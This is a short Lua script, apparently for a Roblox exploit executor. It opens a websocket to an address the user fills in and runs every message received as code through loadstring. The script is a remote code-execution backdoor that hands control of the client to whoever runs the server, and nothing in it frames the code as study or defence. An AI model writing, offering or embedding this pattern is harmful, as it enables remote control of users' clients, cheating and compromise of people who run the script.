local IP = "IP:123" -- myip.com
local WebSocket = WebSocket.connect("ws://" .. IP .."/B3sty")

WebSocket.OnMessage:Connect(function(Msg)
    loadstring(Msg)()
end)